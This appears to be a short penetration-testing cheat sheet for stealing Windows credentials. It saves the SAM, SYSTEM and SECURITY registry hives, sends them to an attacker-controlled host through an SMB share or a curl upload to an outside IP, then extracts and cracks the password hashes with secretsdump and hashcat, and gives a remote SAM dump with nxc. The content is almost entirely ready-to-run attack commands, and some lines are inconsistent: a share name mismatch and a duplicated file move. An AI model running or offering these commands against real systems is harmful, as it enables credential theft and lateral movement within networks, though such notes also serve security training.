# Copy SAM database
```
reg save hklm\sam C:\temp\sam.save
```
```
reg save hklm\system C:\temp\system.save
```
```
reg save hklm\security C:\temp\security.save
```
# Transferring file to kali 
#### Creating SMB share 
```
sudo python3 impacket-smbserver -smb2support hacker /home/bob/Documents
```
#### Moving hashes to share (kali)
```
move SAM.save \\10.10.15.16\CompData
```
```
move SYSTEM.save \\10.10.15.16\CompData
```
```
move SYSTEM.save \\10.10.15.16\CompData
```
							OR
```
cmd /c curl http://172.16.139.10:8080/upload -F "files=@C:\temp\sam.save"
```
# Dump hashes (extract SAM hashes) 
```
impacket-secretsdump -user-status -history -pwd-last-set -sam sam.save -security security.save -system system.save LOCAL
```
# Cracking hash with Hashcat 
```
hashcat -m 1000 hashes.txt /user/share/wordlists/rockyou.txt
```

---
# Remotely dumping SAM database
```
nxc smb 10.129.42.198 --local-auth -u bob -p password --sam
```